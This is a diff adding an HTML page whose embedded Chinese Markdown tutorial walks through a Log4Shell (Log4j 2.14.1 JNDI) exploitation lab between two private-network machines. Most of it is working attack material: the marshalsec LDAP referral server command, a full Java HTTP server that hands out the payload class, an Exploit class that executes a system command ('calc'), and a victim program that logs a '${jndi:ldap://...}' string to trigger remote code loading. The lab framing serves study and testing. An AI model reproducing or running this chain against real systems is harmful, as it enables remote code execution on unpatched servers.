@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>log4j-attact</title>
+</head>
+<link rel="stylesheet" type="text/css" href="../plugin/LanEditor/LanEditor.css"/>
+<link rel="stylesheet" type="text/css" href="../plugin/LanEditor/highlight/styles/idea.css">
+
+<link href="../plugin/SyntaxHighlighter/main.css" rel='stylesheet' type='text/css'>
+<link href="../plugin/SyntaxHighlighter/shCore.css" rel='stylesheet' type='text/css'>
+<link href="../plugin/SyntaxHighlighter/shThemeDefault.css" rel='stylesheet' type='text/css'>
+<link href="../plugin/LanEditor/main.css" rel='stylesheet' type='text/css'>
+
+<script src="../plugin/SyntaxHighlighter/shCore-convert.js" type='text/javascript'></script>
+<script src="../plugin/SyntaxHighlighter/shBrushAll.js" type='text/javascript'></script>
+
+<script type="text/javascript" src="../plugin/LanEditor/jquery-1.11.1.min.js"></script>
+<script type="text/javascript" src="../plugin/autosize/autosize.bundle.js"></script>
+<script type="text/javascript" src="../plugin/LanEditor/LanEditor.js"></script>
+
+<script type="text/javascript">
+
+    window.autosize = require("autosize");
+
+    $(document).ready(function () {
+        //初始化 @textelem:编辑区的id @showelem可以省略
+        var lan = LanEditor.init({
+            textelem: "editor",
+            showelem: "show"
+        });
+        //如果初始化失败，则显示出错信息
+        if(lan.status == false){
+            alter(lan.message);
+            return ;
+        }else{
+            // 默认保存LanEditor快速指南文件
+            // 获取文件创建的时间
+            var createTime = LanEditor.Time.GetTimestamp();
+            // 文件名
+            LanEditor.File.CurOpenFile.name = $(document).attr("title");
+            // 创建时间
+            LanEditor.File.CurOpenFile.time = createTime;
+            // 保存文件
+            LanEditor.File.SaveFile();
+            // 渲染
+            LanEditor.RenderHTML();
+        }
+    });
+</script>
+<body>
+<div id="edit">
+    <textarea id="editor" name="editor">
+### 环境说明
+
+<br/>
+
+ - 攻击者服务器
+
+  IP : 192.168.116.1
+
+ - 用户客户机靶场
+
+  IP : 192.168.116.128
+
+### 攻击者服务器端
+
+#### 资源准备
+
+ - <a href="#001" target="_self">marshalsec-0.0.3-SNAPSHOT-all.jar</a>
+
+ - <a href="#002" target="_self">AttactHttpServer.java</a>
+
+ - <a href="#003" target="_self">Exploit.java</a>
+
+ - 1、创建 _**`log4j-attact`**_ 目录
+
+  1.1、创建 **AttactHttpServer.java**
+
+ - 2、在 _**log4j-attact**_ 目录下创建 _**`ldap`**_ 目录
+
+  2.1、放入 **marshalsec-0.0.3-SNAPSHOT-all.jar**
+
+ - 3、在 _**log4j-attact**_ 目录下创建 _**`classes`**_ 目录
+
+  3.1、创建 **Exploit.java**
+
+完整目录结构
+
+```python
+log4j-attact
+│
+│  AttactHttpServer.class
+│  AttactHttpServer.java
+│
+├─classes
+│      Exploit.class
+│      Exploit.java
+│
+└─ldap
+        marshalsec-0.0.3-SNAPSHOT-all.jar
+```
+
+#### 步骤1、开启 LDAP 服务
+
+ - 开启 LDAP 服务
+
+```python
+# 进入 log4j-attact/ldap 目录
+cd log4j-attact/ldap
+
+# 开启 LDAP 服务
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.116.1:8555/#Exploit" 8888
+```
+
+##### 参数说明
+
+ - _**参数一**_
+
+  **`"http://192.168.116.1:8555/#Exploit"`**
+
+  **LDAP服务资源注册地址**
+
+  **"http://`IP`:`PORT`/#`CLASSNAME`"**
+
+ - _**参数二**_
+
+  **`8888`**
+
+  **LDAP服务端口**
+
+ LDAP 服务开启 8888 端口监听，请求 LDAP 服务后会返回资源所在地址。
+
+```python
+# 由 LDAP 格式化后的资源地址
+
+http://192.168.116.1:8555/Exploit.class
+```
+
+#### 步骤2、开启 HTTP 服务
+
+ - 1、编译 **AttactHttpServer.java**
+
+```python
+javac AttactHttpServer.java
+```
+
+ - 2、运行 **AttactHttpServer**
+
+```python
+java AttactHttpServer
+```
+
+#### 步骤3、攻击代码
+
+ - 1、编译 **Exploit.java**
+
+```python
+javac Exploit.java
+```
+
+完整目录结构
+
+```python
+log4j-attact
+│
+│  AttactHttpServer.class
+│  AttactHttpServer.java
+│
+├─classes
+│      Exploit.class
+│      Exploit.java
+│
+└─ldap
+        marshalsec-0.0.3-SNAPSHOT-all.jar
+```
+
+#### 客户机靶场漏洞利用
+
+##### 方式一
+
+ - 1、创建 Maven 项目，引入受影响的 Log4j 依赖
+
+```xml
+<dependencies>
+    <dependency>
+        <groupId>org.apache.logging.log4j</groupId>
+        <artifactId>log4j-core</artifactId>
+        <version>2.14.1</version>
+    </dependency>
+</dependencies>
+```
+
+ - 2、漏洞利用测试
+
+```java
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class LogTest {
+
+    public static final Logger logger = LogManager.getLogger();
+
+    public static void main(String[] args) {
+        logger.error("${jndi:ldap://192.168.116.1:8888/Exploit}");
+    }
+}
+```
+
+##### 方式二
+
+资源准备
+
+ - log4j-api-2.14.1.jar
+
+ - log4j-core-2.14.1.jar
+
+ - LogTest.java
+
+
+ - 1、创建 _**`client`**_ 目录
+
+ 1.1、创建 **LogTest.java**
+
+ - 2、在 _**client**_ 目录下创建 _**`lib`**_ 目录
+
+ 2.1、放入 **log4j-api-2.14.1.jar**
+
+ 2.2、放入 **log4j-core-2.14.1.jar**
+
+完整目录结构
+
+```python
+client
+│  
+│  LogTest.class
+│  LogTest.java
+│
+└─lib
+        log4j-api-2.14.1.jar
+        log4j-core-2.14.1.jar
+```
+
+##### 漏洞利用测试
+
+ - 1、编译 LogTest.java
+
+```python
+# 编译 LogTest.java
+javac -cp .;lib/* LogTest.java
+```
+
+ - 2、运行测试
+
+```python
+# 运行测试
+java -cp .;lib/* LogTest
+```
+
+ - 3、利用成功
+
+  - 弹出计算器
+
+#### 注意事项
+
+ - 此方式只适用于两台电脑之间（可用虚拟机），不支持本机运行双端程序。
+
+  - 单机运行时，由于 LDAP 返回的资源地址是本机 IP，程序运行时就不会去请求该地址的资源路径，而是**只会在当前 `classpath` 下查找返回的资源**。
+
+  - 如需本机快速验证测试，可将 **`Exploit.class`** 放在 **client** 目录下。
+
+单机测试完整目录结构
+
+```python
+client
+│  
+│  Exploit.class
+│  LogTest.class
+│  LogTest.java
+│
+└─lib
+        log4j-api-2.14.1.jar
+        log4j-core-2.14.1.jar
+```
+
+
+#### 相关资源
+
+ - <span id="001">**marshalsec-0.0.3-SNAPSHOT-all.jar**</span> <a href="https://gitee.com/fcncdn/marshalsec-0.0.3/raw/master/marshalsec-0.0.3-SNAPSHOT-all.jar" target="_blank">下载</a>
+
+ - <span id="002">**AttactHttpServer.java**</span>
+
+```java
+import com.sun.net.httpserver.*;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.io.FileOutputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.net.InetSocketAddress;
+import java.net.URI;
+
+public class AttactHttpServer {
+
+  public static void main(String[] args) throws IOException {
+      int port = 8555;
+      HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
+      HttpContext context = server.createContext("/");
+      context.setHandler(AttactHttpServer::handleRequest);
+      server.start();
+      System.out.println("ATTACT HTTP SERVER START AT " + port);
+  }
+
+  private static void handleRequest(HttpExchange exchange) throws IOException {
+      synchronized(System.out){
+          URI requestURI = exchange.getRequestURI();
+          if(requestURI.toString().endsWith(".class")){
+            System.out.println("SEND /classes/Exploit.class TO:" + exchange.getRemoteAddress());
+            try (InputStream is = AttactHttpServer.class.getResourceAsStream("/classes/Exploit.class")){
+              byte[] datas = new byte[is.available()];
+              is.read(datas, 0, datas.length);
+              is.close();
+              exchange.sendResponseHeaders(200, datas.length);
+              OutputStream os = exchange.getResponseBody();
+              os.write(datas);
+              os.close();
+            } catch(Exception e){
+              exchange.sendResponseHeaders(500, 0);
+              OutputStream os = exchange.getResponseBody();
+              os.close();
+              e.printStackTrace();
+            }
+          } else {
+            String response = "This is the response at " + requestURI;
+            exchange.sendResponseHeaders(200, response.getBytes().length);
+            OutputStream os = exchange.getResponseBody();
+            os.write(response.getBytes());
+            os.close();
+          }
+      }
+  }
+}
+```
+
+ - <span id="003">**Exploit.java**</span>
+
+```java
+import java.io.IOException;
+
+public class Exploit {
+  static {
+    System.err.println("pwned");
+    try {
+      String cmds = "calc";
+      Runtime.getRuntime().exec(cmds);
+    } catch (IOException e) {
+      e.printStackTrace();
+    }
+  }
+}
+```
+    </textarea>
+</div>
+
+<div id="show"></div>
+</body>
+</html>
